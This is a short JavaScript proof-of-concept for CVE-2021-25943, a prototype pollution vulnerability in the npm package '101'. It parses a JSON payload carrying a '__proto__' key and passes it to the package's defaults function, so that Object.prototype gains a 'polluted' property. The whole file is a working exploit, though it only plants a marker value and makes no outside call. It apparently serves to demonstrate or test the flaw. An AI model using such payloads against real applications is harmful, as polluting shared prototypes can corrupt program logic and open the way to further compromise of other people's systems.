//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25943
const _101 = require("101/defaults");
payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
_101({}, payload, true);
